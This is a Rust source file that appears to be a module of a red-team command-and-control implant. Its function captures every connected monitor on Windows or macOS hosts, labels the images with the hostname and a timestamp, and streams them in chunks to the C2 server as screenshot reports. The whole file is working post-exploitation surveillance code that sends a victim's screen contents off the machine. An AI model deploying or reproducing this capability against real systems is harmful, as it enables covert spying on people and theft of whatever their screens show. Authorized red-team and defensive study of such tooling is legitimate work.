use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};

#[cfg(not(target_os = "linux"))]
use {
    alloc::format,
    alloc::string::{String, ToString},
    alloc::vec::Vec,
    image::ImageFormat,
    pb::c2::report_file_request,
    pb::{c2, eldritch},
    std::io::Cursor,
    std::sync::Mutex,
    xcap::Monitor,
};

#[cfg(all(unix, feature = "stdlib"))]
fn get_hostname() -> String {
    nix::unistd::gethostname()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(all(unix, not(feature = "stdlib")))]
fn get_hostname() -> String {
    std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(windows)]
fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(not(any(unix, windows)))]
fn get_hostname() -> String {
    "unknown".to_string()
}

#[cfg(target_os = "linux")]
pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    return Err(
        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported".to_string()
    );
}

#[cfg(not(target_os = "linux"))]
pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    if monitors.is_empty() {
        return Ok(());
    }

    let hostname = get_hostname();

    for (i, monitor) in monitors.iter().enumerate() {
        // Capture image
        let image = monitor.capture_image().map_err(|e| e.to_string())?;

        // Convert to PNG
        let mut buffer = Cursor::new(Vec::new());
        image
            .write_to(&mut buffer, ImageFormat::Png)
            .map_err(|e| e.to_string())?;
        let png_data = buffer.into_inner();

        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, i);

        // Prepare context
        let context_val = match context {
            Context::Task(ref tc) => Some(report_file_request::Context::TaskContext(tc.clone())),
            Context::ShellTask(ref stc) => {
                Some(report_file_request::Context::ShellTaskContext(stc.clone()))
            }
        };

        // Error handling for the streaming thread
        let error: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));

        // Use a sync channel with bound 1 to provide backpressure
        let (tx, rx) = std::sync::mpsc::sync_channel(1);

        let chunk_size = 1024 * 1024; // 1MB
        let total_size = png_data.len();

        let png_data_clone = png_data.clone();
        let filename_clone = filename.clone();
        let context_val_clone = context_val.clone();

        // Spawn thread for streaming
        std::thread::spawn(move || {
            let mut offset = 0;
            let mut metadata_sent = false;

            loop {
                if offset >= total_size {
                    break;
                }

                let end = std::cmp::min(offset + chunk_size, total_size);
                let chunk_data = png_data_clone[offset..end].to_vec();

                let metadata = if !metadata_sent {
                    metadata_sent = true;
                    Some(eldritch::FileMetadata {
                        path: filename_clone.clone(),
                        permissions: "644".to_string(),
                        owner: "root".to_string(),
                        group: "root".to_string(),
                        size: total_size as u64,
                        ..Default::default()
                    })
                } else {
                    None
                };

                let file_msg = eldritch::File {
                    metadata,
                    chunk: chunk_data,
                };

                let req = c2::ReportFileRequest {
                    context: context_val_clone.clone(),
                    chunk: Some(file_msg),
                    kind: c2::ReportFileKind::Screenshot as i32,
                };

                if tx.send(req).is_err() {
                    break;
                }

                offset += chunk_size;
            }
        });

        // Send stream to agent (blocking)
        agent.report_file(rx).map(|_| ())?;

        if let Some(e) = error.lock().unwrap().as_ref() {
            return Err(e.clone());
        }
    }

    Ok(())
}
